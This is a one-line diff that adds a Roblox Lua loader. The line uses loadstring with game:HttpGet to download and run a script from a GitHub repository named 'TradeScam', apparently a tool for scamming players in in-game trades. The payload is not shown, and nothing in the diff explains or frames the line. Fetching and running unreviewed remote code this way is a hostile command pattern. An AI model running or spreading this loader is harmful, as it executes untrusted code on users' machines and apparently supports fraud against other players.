@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Luckylucas20011/TradeScam/main/Premium"))()
